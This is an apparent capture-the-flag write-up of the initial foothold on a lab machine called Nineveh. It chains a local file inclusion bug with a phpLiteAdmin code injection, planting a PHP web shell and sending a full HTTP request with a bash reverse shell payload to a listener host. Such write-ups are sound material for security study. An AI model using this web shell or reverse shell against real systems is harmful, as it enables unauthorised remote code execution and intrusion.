# Foothold

## www-data

- Logging in using the credentials, we get a page called as notes from http://10.10.10.43/departments/manage.php
![[Pasted image 20210331020703.png]]
- But the link shows a case of local file inclusion `http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt`.
- Thus from [[10 - Web Server#Port 443]] we saw a login to phpLiteadmin and a remote PHP code injection bug also. So we can create a database, and create a table called ninevehNotes, and then put `<?php echo system($_REQUEST["sad"])?>` as the field name
- We can rename the database as ninevehNotes.php
- We can see it is stored at `/var/tmp/ninevehNotes.php`
- We can now visit the page from the LFI bug and set our parameter `sad=ls`, this will give us remote code execution.
- We can get a reverse shell by sending the request through burp and running a listener on the local machine.
```bash
POST /department/manage.php?notes=/var/tmp/ninevehNotes.php HTTP/1.1
Host: 10.10.10.43
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=6am0khatc9bb9p5gddbepd2v83
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

sad=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/9001+0>%261'
```

